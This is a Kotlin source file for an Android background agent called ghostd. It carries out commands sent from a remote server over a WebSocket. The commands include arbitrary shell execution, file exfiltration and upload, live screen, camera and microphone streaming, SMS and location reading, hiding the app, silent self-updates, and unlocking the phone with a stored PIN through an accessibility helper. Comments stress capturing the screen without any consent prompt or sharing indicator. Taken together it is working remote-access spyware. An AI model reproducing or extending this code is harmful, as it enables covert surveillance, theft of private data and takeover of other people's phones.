package com.tg.ghostd

import android.content.Context
import com.neovisionaries.ws.client.WebSocket
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * Executes commands received over the WebSocket and sends back the result.
 *
 * Protocol (matches server/daemon.py):
 *   in:  {"type":"cmd","cmd_id":..,"action":..,"args":[..]}
 *   out: {"type":"result","cmd_id":..,"id":..,"status":"ok"|"error",
 *         "ok":bool,"result":..}
 *
 * Streamed media (screen live/record, cam live, mic live) additionally uses
 * binary frames framed as: "<json header>\n<payload>" — see [MediaBus].
 */
object CommandHandler {

    @Volatile private var appContext: Context? = null

    /** Called once from GhostService.onCreate. */
    fun init(ctx: Context) {
        appContext = ctx.applicationContext
    }

    fun handle(ws: WebSocket, text: String) {
        val msg = try {
            JSONObject(text)
        } catch (_: Exception) {
            return
        }
        // incoming file stream terminator (see FileReceiver / files put)
        if (msg.optString("type") == FileTransfer.TYPE_END) {
            FileReceiver.onEnd(msg)
            return
        }
        if (msg.optString("type") != "cmd") return
        val cmdId = msg.optString("cmd_id")

        // Reserve a files-put slot NOW, on the WebSocket thread. The server
        // starts sending chunks immediately after this command; preparing on
        // the worker created a race where early chunks/file_end were dropped.
        var prepared: FileReceiver.Transfer? = null
        if (msg.optString("action") == "files") {
            val args = msg.optJSONArray("args")
            if (args?.optString(0) == "put") {
                try {
                    prepared = FileReceiver.prepare(args.optString(1, ""), cmdId, ws)
                } catch (e: Exception) {
                    try {
                        ws.sendText(error(cmdId, e.message ?: "files put failed").toString())
                    } catch (_: Exception) {
                    }
                    return
                }
            }
        }

        // execute off the websocket thread
        Thread {
            val resp = try {
                execute(msg, ws, prepared).put("cmd_id", cmdId).put("id", cmdId)
            } catch (e: Exception) {
                error(cmdId, e.message ?: "error")
            }
            try {
                ws.sendText(resp.toString())
            } catch (_: Exception) {
                // socket died; reconnect loop will handle it
            }
        }.start()
    }

    /** Incoming binary frames from the server (file streams; MediaBus framing). */
    fun onBinary(data: ByteArray) {
        val (header, payload) = FileTransfer.parseFrame(data) ?: return
        when (header.optString("type")) {
            FileTransfer.TYPE_CHUNK -> FileReceiver.onChunk(header, payload)
            FileTransfer.TYPE_END -> FileReceiver.onEnd(header)
        }
    }

    private fun execute(
        msg: JSONObject, ws: WebSocket, prepared: FileReceiver.Transfer? = null
    ): JSONObject {
        val action = msg.optString("action")
        val cmdId = msg.optString("cmd_id")
        val args = msg.optJSONArray("args") ?: JSONArray()
        val ctx = appContext ?: throw Exception("service context not ready")
        val result: Any = when (action) {
            "shell" -> shell(args.optString(0, "id"))
            "files" -> {
                if (args.optString(0) == "put") {
                    val t = prepared ?: throw Exception(
                        "files put: slot not prepared on the WebSocket thread"
                    )
                    FileReceiver.await(t)
                } else {
                    filesCmd(ws, args, cmdId)
                }
            }
            "screen" -> screenCmd(ctx, ws, args)
            "cam" -> camCmd(ctx, ws, args)
            "mic" -> micCmd(ctx, ws, args)
            "brightness" -> brightnessCmd(ctx, args)
            "volume" -> volumeCmd(ctx, args)
            "update" -> updateCmd(ctx, args)
            "wake" -> SystemControl.wake(ctx)
            // ---- sidekick (ghosta) forwarded verbs ----
            "ui" -> uiCmd(args)
            "tap" -> tapCmd("tap", args)
            "longclick" -> tapCmd("longclick", args)
            "type" -> sidekickSend(
                JSONObject().put("cmd", "type").put("text", joinArgs(args, 0))
            )
            "key" -> sidekickSend(
                JSONObject().put("cmd", "key").put("code", intArg(args, 0))
            )
            "swipe" -> swipeCmd(args)
            "unlock" -> unlockCmd(ctx, args)
            "arm" -> sidekickSend(JSONObject().put("cmd", "arm"))
            "disarm" -> sidekickSend(JSONObject().put("cmd", "disarm"))
            "sidekick" -> sidekickCmd(ctx, args)
            // ---- device data / health ----
            "sms" -> smsCmd(ctx, args)
            "loc" -> DataReaders.locationOnce(ctx)
            "device" -> DataReaders.deviceInfo(ctx)
            "status" -> DataReaders.status(ctx)
            "hide" -> DataReaders.setHidden(ctx, true)
            "unhide" -> DataReaders.setHidden(ctx, false)
            "restart" -> restartSelf(ctx)
            else -> throw Exception("unknown action: $action")
        }
        return JSONObject()
            .put("type", "result")
            .put("status", "ok").put("ok", true).put("result", result)
    }

    // ---------------------------------------------------------------- screen

    /**
     * Still capture without MediaProjection whenever ghosta is available.
     * Accessibility screenshots (Android 11+) show neither a consent sheet
     * nor the persistent screen-sharing indicator. Fall back to the existing
     * projection capturer on older devices or if the sidekick is unavailable.
     */
    private fun silentScreenShot(ctx: Context, ws: WebSocket): JSONObject {
        val viaSidekick = sidekickSend(
            JSONObject().put("cmd", "screenshot").put("format", "png")
        )
        if (viaSidekick.optBoolean("ok")) {
            val b64 = viaSidekick.remove("b64")
            if (b64 != null) viaSidekick.put("png_b64", b64)
            return viaSidekick.put("source", "accessibility")
        }
        return ScreenCapturer.shot(ctx, ws)
            .put("source", "media_projection")
            .put("accessibility_error", viaSidekick.optString("error", "unavailable"))
    }

    /**
     * screen shot
     * screen record <secs> [--fps N] [--quality 10-100]
     * screen live [--fps N] [--quality 10-100]   (a.k.a. screen start)
     * screen stop   — stop an active stream
     * screen off    — also stop the MediaProjection itself
     */
    private fun screenCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 1)
        return when (sub) {
            "shot" -> silentScreenShot(ctx, ws)
            "record" -> {
                val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 600)
                ScreenCapturer.stream(
                    ctx, ws, secs,
                    o["fps"]?.toIntOrNull(), o["quality"]?.toIntOrNull(),
                    "screen-record"
                )
            }
            "live", "start" -> ScreenCapturer.stream(
                ctx, ws, o["secs"]?.toIntOrNull()?.coerceIn(1, 600),
                o["fps"]?.toIntOrNull(), o["quality"]?.toIntOrNull(),
                "screen-live"
            )
            "stop" -> ScreenCapturer.stop()
            "off" -> {
                // full teardown: unsticks the stream/shot worker, force-
                // releases the busy slot and stops the projection itself
                // (ProjectionHub.stop is lock-free, so it works even while
                // a capture is wedged mid-grant).
                ScreenCapturer.stop()
                ProjectionHub.stop()
                JSONObject().put("projection", "stopped")
            }
            else -> throw Exception("screen: expected shot|record|live|stop|off")
        }
    }

    // ------------------------------------------------------------------- cam

    /**
     * cam snap <front|back>
     * cam live <front|back> [--quality low|med|high|480p|720p|1080p] [--fps N]
     * cam stop
     */
    private fun camCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 2)
        try {
            return when (sub) {
                "snap" -> CameraCapturer.snap(ctx, facing(args, 1))
                "live", "start" -> CameraCapturer.live(
                    ctx, ws, facing(args, 1), o["quality"], o["fps"]?.toIntOrNull()
                )
                "stop" -> CameraCapturer.stop()
                else -> throw Exception("cam: expected snap|live|stop")
            }
        } catch (e: Exception) {
            // Turn cryptic vendor errors into something actionable.
            val m = e.message ?: ""
            if (m.contains("disabled by policy", ignoreCase = true)) {
                throw Exception(
                    "camera blocked by the system: turn on the phone's global " +
                        "camera access toggle (Quick Settings → Camera access, or " +
                        "Settings → Security & privacy → Privacy controls → Camera access)"
                )
            }
            throw e
        }
    }

    private fun facing(args: JSONArray, idx: Int): String {
        val f = args.optString(idx, "back")
        return if (f == "front") "front" else "back"
    }

    // ------------------------------------------------------------------- mic

    /**
     * mic record <secs> [--rate N] [--mono]   (default 44100 stereo)
     * mic live
     * mic stop
     */
    private fun micCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 2)
        return when (sub) {
            "record" -> {
                val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 60)
                val rate = (o["rate"]?.toIntOrNull() ?: 44_100).coerceIn(8_000, 48_000)
                val channels = if (o.containsKey("mono")) 1 else 2
                MicCapturer.record(ctx, secs, rate, channels)
            }
            "live", "start" -> MicCapturer.live(ctx, ws)
            "stop" -> MicCapturer.stop()
            else -> throw Exception("mic: expected record|live|stop")
        }
    }

    // ---------------------------------------------------------------- update

    /**
     * update self [apk_path]      — silent ghostd self-update
     * update sidekick [apk_path]  — ghosta update (silent when ghostd is its
     *                               installer-of-record; else confirm+auto-tap)
     * When apk_path is absent, the APK is first RECEIVED via the files-put
     * flow (server pushes it to the default path). Blocks until the final
     * install status and reports it (old version -> new version) BEFORE the
     * connection reboots (the service restarts after a self-update).
     */
    private fun updateCmd(ctx: Context, args: JSONArray): Any {
        return when (val sub = args.optString(0, "")) {
            "self" -> AppUpdater.updateSelf(ctx, argOrNull(args, 1))
            "sidekick" -> AppUpdater.updateSidekick(ctx, argOrNull(args, 1))
            else -> throw Exception("update: expected self|sidekick [apk_path], got '$sub'")
        }
    }

    private fun argOrNull(args: JSONArray, i: Int): String? =
        if (args.length() > i) args.optString(i) else null

    // ------------------------------------------------------- brightness/volume

    /**
     * brightness get | brightness set <0-255>
     */
    private fun brightnessCmd(ctx: Context, args: JSONArray): Any {
        return when (args.optString(0, "get")) {
            "get" -> SystemControl.brightnessGet(ctx)
            "set" -> SystemControl.brightnessSet(
                ctx, args.optString(1, "128").toIntOrNull() ?: 128
            )
            else -> throw Exception("brightness: expected get|set <0-255>")
        }
    }

    /**
     * volume get <stream> | volume set <stream> <0-100> |
     * volume mute <stream> | volume unmute <stream>
     * stream: ring|media|alarm|notification|system
     */
    private fun volumeCmd(ctx: Context, args: JSONArray): Any {
        val sub = args.optString(0, "")
        return when (sub) {
            "get" -> SystemControl.volumeGet(ctx, args.optString(1, "media"))
            "set" -> SystemControl.volumeSet(
                ctx, args.optString(1, "media"),
                args.optString(2, "50").toIntOrNull() ?: 50
            )
            "mute" -> SystemControl.volumeMute(ctx, args.optString(1, "media"), true)
            "unmute" -> SystemControl.volumeMute(ctx, args.optString(1, "media"), false)
            else -> throw Exception("volume: expected get|set|mute|unmute <stream>")
        }
    }

    // -------------------------------------------------------------- sidekick

    /**
     * Forward a command to the sidekick over the local link and return its
     * JSON response verbatim (see client-sidekick/README.md for the exact
     * protocol: dump/find/tap/longclick/type/key/swipe/unlock/arm/disarm/...).
     */
    // ------------------------------------------------------------ keyguard

    /**
     * `unlock <pin>` / `unlock --forget`
     *
     * Wake the screen, let ghosta swipe up and enter the PIN. A successful
     * unlock REMEMBERS the PIN (AES/GCM via Android Keystore) so that later
     * `update self` runs can unlock unattended; pass `--forget` to wipe it.
     */
    private fun unlockCmd(ctx: Context, args: JSONArray): JSONObject {
        val pin = args.optString(0, "")
        if (pin.isBlank() || pin == "--forget") {
            Prefs.clearPin(ctx)
            return JSONObject().put("ok", true).put("pin_forgotten", true)
        }
        val res = doUnlock(ctx, pin)
        if (res.optBoolean("ok") && !joinArgs(args, 1).contains("no-remember")) {
            Prefs.setPin(ctx, pin)
            res.put("pin_saved", true)
        }
        return res
    }

    /** Unlock using the PIN remembered from an earlier `unlock`. */
    fun unlockWithStoredPin(ctx: Context): JSONObject {
        val pin = Prefs.pin(ctx)
            ?: return JSONObject().put("ok", false).put("error", "no stored PIN")
        return doUnlock(ctx, pin)
    }

    private fun doUnlock(ctx: Context, pin: String): JSONObject {
        try {
            SystemControl.wake(ctx)
        } catch (_: Exception) {
        }
        Thread.sleep(700)
        return sidekickSend(JSONObject().put("cmd", "unlock").put("pin", pin))
    }

    /**
     * `restart` — clean process restart, the last-resort recovery.
     *
     * Aborts any half-done transfer, lets the result frame reach the server,
     * then kills this process. START_STICKY (plus the kick path) brings the
     * agent back within seconds with fresh threads and an empty transfer
     * slot — which is how a wedged receiver is cleared without touching the
     * phone.
     */
    private fun restartSelf(ctx: Context): JSONObject {
        FileReceiver.abortAll("restart")
        Thread {
            try {
                Thread.sleep(700)      // give the result frame time to flush
            } catch (_: InterruptedException) {
            }
            android.os.Process.killProcess(android.os.Process.myPid())
        }.apply {
            isDaemon = true
            name = "ghostd-restart"
            start()
        }
        return JSONObject().put("ok", true).put("restarting", true)
    }

    // ----------------------------------------------------------- sms / data
    /**
     * `sms recent [N]` — newest messages (default 20, max 200).
     */
    private fun smsCmd(ctx: Context, args: JSONArray): Any {
        val sub = args.optString(0, "recent")
        val limit = when (sub) {
            "recent", "" -> args.optString(1, "20").toIntOrNull() ?: 20
            else -> throw Exception("sms: expected 'recent [N]', got '$sub'")
        }
        return DataReaders.smsRecent(ctx, limit)
    }

    private fun sidekickSend(cmd: JSONObject): JSONObject = try {
        SidekickLink.send(cmd)
    } catch (e: Exception) {
        JSONObject().put("ok", false)
            .put("error", "sidekick link: ${e.message}")
    }

    /**
     * ui dump                          → {"cmd":"dump"} (full node tree)
     * ui find <text>                   → {"cmd":"find","text":...}
     * ui find --text <t> | --id <id>   → find by text/desc or view resource id
     */
    private fun uiCmd(args: JSONArray): JSONObject {
        val sub = args.optString(0, "")
        return when (sub) {
            "dump" -> sidekickSend(JSONObject().put("cmd", "dump"))
            "find" -> {
                val o = opts(args, 1)
                val cmd = JSONObject().put("cmd", "find")
                when {
                    o.containsKey("id") -> cmd.put("id", o["id"])
                    o.containsKey("text") -> cmd.put("text", o["text"])
                    args.length() > 1 -> cmd.put("text", joinArgs(args, 1))
                    else -> throw Exception("ui find: expected --text <t> or --id <id>")
                }
                sidekickSend(cmd)
            }
            "status" -> sidekickSend(JSONObject().put("cmd", "status"))
            else -> throw Exception("ui: expected dump|find [--text|--id]")
        }
    }

    /**
     * tap <id|x,y> / longclick <id|x,y> — id is a node index path like
     * "root/0/3"; otherwise the two args are x/y coordinates.
     */
    private fun tapCmd(verb: String, args: JSONArray): JSONObject {
        val cmd = JSONObject().put("cmd", verb)
        val first = args.optString(0, "")
        if (first.contains("/")) {
            cmd.put("id", first)
        } else if (args.length() >= 2) {
            cmd.put("x", intArg(args, 0)).put("y", intArg(args, 1))
        } else {
            throw Exception("$verb: expected <node-id> or <x> <y>")
        }
        return sidekickSend(cmd)
    }

    /** swipe x1 y1 x2 y2 [duration_ms] */
    private fun swipeCmd(args: JSONArray): JSONObject {
        if (args.length() < 4) throw Exception("swipe: expected <x1> <y1> <x2> <y2> [duration]")
        return sidekickSend(
            JSONObject().put("cmd", "swipe")
                .put("x1", intArg(args, 0)).put("y1", intArg(args, 1))
                .put("x2", intArg(args, 2)).put("y2", intArg(args, 3))
                .put("duration", (args.optString(4, "300").toIntOrNull() ?: 300))
        )
    }

    /**
     * sidekick status | arm | disarm | ping | install [apk] | reinstall
     * install:   installs a previously-pushed ghosta APK (see SidekickInstaller
     *            for the confirm+auto-tap flow).
     * reinstall: redoes the BUNDLED-asset install (assets/ghosta.apk) —
     *            silent when ghostd is ghosta's installer-of-record, else the
     *            confirm+auto-tap (armed sidekick) flow. Use after ghostd
     *            updates if ghosta went missing / lagged behind.
     */
    private fun sidekickCmd(ctx: Context, args: JSONArray): Any {
        return when (args.optString(0, "status")) {
            "status" -> sidekickSend(JSONObject().put("cmd", "status"))
            "arm" -> sidekickSend(JSONObject().put("cmd", "arm"))
            "disarm" -> sidekickSend(JSONObject().put("cmd", "disarm"))
            "ping" -> sidekickSend(JSONObject().put("cmd", "ping"))
            "install" -> SidekickInstaller.install(
                ctx,
                if (args.length() > 1) args.optString(1) else SidekickInstaller.DEFAULT_APK_PATH
            )
            "reinstall" -> SidekickInstaller.provisionBundled(ctx, force = true)
            else -> throw Exception(
                "sidekick: expected status|arm|disarm|ping|install [apk]|reinstall"
            )
        }
    }

    // ---------------------------------------------------------------- files

    /**
     * files ls [path]
     * files get <path> [dest]  — stream file to server (binary chunks)
     * files put <path>        — receive a file stream from the server
     * files tree [path] [--depth N]  — recursive listing with sizes
     */
    private fun filesCmd(ws: WebSocket, args: JSONArray, cmdId: String): Any {
        return when (args.optString(0, "ls")) {
            "ls" -> filesLs(args)
            "get" -> {
                if (args.length() < 2) throw Exception("files get: expected <path> [dest]")
                FileTransfer.sendFile(
                    ws, args.optString(1), cmdId,
                    if (args.length() > 2) args.optString(2) else null
                )
            }
            "put" -> throw Exception(
                "files put: slot must be prepared on the WebSocket thread"
            )
            "abort" -> FileReceiver.abortAll("operator request")
            "tree" -> {
                val o = opts(args, 1)
                val path = when {
                    args.length() > 1 && !args.optString(1).startsWith("--") -> args.optString(1)
                    else -> "/sdcard"
                }
                filesTree(path, (o["depth"]?.toIntOrNull() ?: 5).coerceIn(1, 10))
            }
            else -> throw Exception("files: expected ls|get|put|tree")
        }
    }

    /** Recursive listing with sizes, depth-limited (default 5). */
    private fun filesTree(rootPath: String, maxDepth: Int): JSONObject {
        val root = File(rootPath)
        if (!root.exists()) throw Exception("no such file or directory: $rootPath")
        val entries = JSONArray()
        var truncated = false

        fun entry(f: File, depth: Int): JSONObject = JSONObject()
            .put("name", f.name)
            .put("path", f.absolutePath)
            .put("dir", f.isDirectory)
            .put("size", f.length())
            .put("depth", depth)

        fun walk(dir: File, depth: Int) {
            val kids = dir.listFiles() ?: return
            for (c in kids.sortedBy { it.name }) {
                if (entries.length() >= TREE_ENTRY_CAP) {
                    truncated = true
                    return
                }
                entries.put(entry(c, depth))
                if (c.isDirectory && depth < maxDepth) walk(c, depth + 1)
            }
        }

        if (root.isDirectory) walk(root, 0) else entries.put(entry(root, 0))
        return JSONObject()
            .put("root", root.absolutePath)
            .put("depth", maxDepth)
            .put("count", entries.length())
            .put("truncated", truncated)
            .put("entries", entries)
    }

    private fun intArg(args: JSONArray, i: Int): Int =
        args.optString(i).toDoubleOrNull()?.toInt()
            ?: throw Exception("expected integer at arg $i, got '${args.optString(i)}'")

    /** Join positional args from [from] with spaces (e.g. `type hello world`). */
    private fun joinArgs(args: JSONArray, from: Int): String {
        val sb = StringBuilder()
        for (i in from until args.length()) {
            if (sb.isNotEmpty()) sb.append(' ')
            sb.append(args.optString(i))
        }
        return sb.toString()
    }

    // ------------------------------------------------------------------ util

    /** Parse "--key value" options out of args starting at [from]. */
    private fun opts(args: JSONArray, from: Int): Map<String, String> {
        val m = HashMap<String, String>()
        var i = maxOf(from, 0)
        while (i < args.length()) {
            val a = args.optString(i)
            if (a.startsWith("--")) {
                if (i + 1 < args.length() && !args.optString(i + 1).startsWith("--")) {
                    m[a.substring(2)] = args.optString(i + 1)
                    i += 2
                } else {
                    m[a.substring(2)] = ""
                    i++
                }
            } else i++
        }
        return m
    }

    /** files ls: args = ["ls", "<path>"] (path defaults to /sdcard/Download). */
    private fun filesLs(args: JSONArray): JSONArray {
        val path = if (args.length() > 1 && args.optString(0) == "ls") args.optString(1)
        else if (args.length() > 0) args.optString(0)
        else "/sdcard/Download"
        val dir = File(path)
        if (!dir.exists()) throw Exception("no such file or directory: $path")
        val out = JSONArray()
        val files = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name })) ?: return out
        for (f in files) {
            out.put(
                JSONObject()
                    .put("name", f.name)
                    .put("path", f.absolutePath)
                    .put("dir", f.isDirectory)
                    .put("size", f.length())
            )
        }
        return out
    }

    /** shell: run `sh -c <command>`, capture rc/stdout/stderr. */
    private fun shell(command: String): JSONObject {
        val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
        val stdout = proc.inputStream.bufferedReader().readText()
        val stderr = proc.errorStream.bufferedReader().readText()
        val rc = try {
            proc.waitFor()
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
            -1
        }
        return JSONObject().put("rc", rc).put("stdout", stdout).put("stderr", stderr)
    }

    private fun error(cmdId: String, message: String): JSONObject = JSONObject()
        .put("type", "result").put("cmd_id", cmdId).put("id", cmdId)
        .put("status", "error").put("ok", false).put("result", message)

    /** Safety cap for files tree output entries. */
    private const val TREE_ENTRY_CAP = 10_000
}
